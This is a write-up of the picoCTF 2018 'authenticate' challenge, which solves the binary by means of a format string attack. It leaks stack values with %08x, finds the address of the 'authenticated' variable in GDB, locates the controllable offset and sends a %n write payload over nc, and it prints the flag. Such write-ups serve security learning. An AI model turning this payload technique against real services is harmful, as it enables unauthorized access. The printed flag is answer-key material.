# authenticate
Binary Exploitation - 350 points

## Challenge 
> Can you [authenticate](auth) to this service and get the flag? Connect with nc 2018shell2.picoctf.com 52398. 

>[Source.](auth.c)

## Hint
> What happens if you say something OTHER than yes or no?

## Solution

References

- https://ehsandev.com/pico2014/binary_exploitation/format.html
- https://stackoverflow.com/questions/19166698/format-strings-and-using-n-to-overwrite-memory-address-with-specific-value

### Format string attack

If we don't input either yes or no, it will print our input value


	$ nc 2018shell2.picoctf.com 52398
	Would you like to read the flag? (yes/no)
	'%{num}$08x'
	%08$08x
	%08$08x
	%08$08x
	%08$08x
	 %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
	Received Unknown Input:

	080489a6 f77c25a0 0804875a f77f9000 f77f9918 ffbcd5f0 ffbcd6e4 00000000 ffbcd684 0000042a 78383025 38302520 Sorry, you are not *authenticated*!

Since we want to modify `authenticated`, let's first find its address through GDB

	(gdb) p &authenticated
	$1 = (<data variable, no debug info> *) 0x804a04c <authenticated>


For format string, we need to first find out what buffer area we can control to select the address of the `authenticated` variable

	$ for num in {1..10}; do echo "ABCD $num %$num\$08x" | ./auth ; done; 
	...

	Would you like to read the flag? (yes/no)
	Received Unknown Input:

	ABCD 11 44434241
	Sorry, you are not *authenticated*!

So we can control offset 11 and set the address to `0x804a04c`. Afterwhich we use `%n` write to it.

	\x4c\xa0\x04\x08 %11$n

## Flag

	
	$ python -c 'print "\x4c\xa0\x04\x08 %11$n"' | nc 2018shell2.picoctf.com 52398
	Would you like to read the flag? (yes/no)
	Received Unknown Input:

	L 
	Access Granted.
	picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}
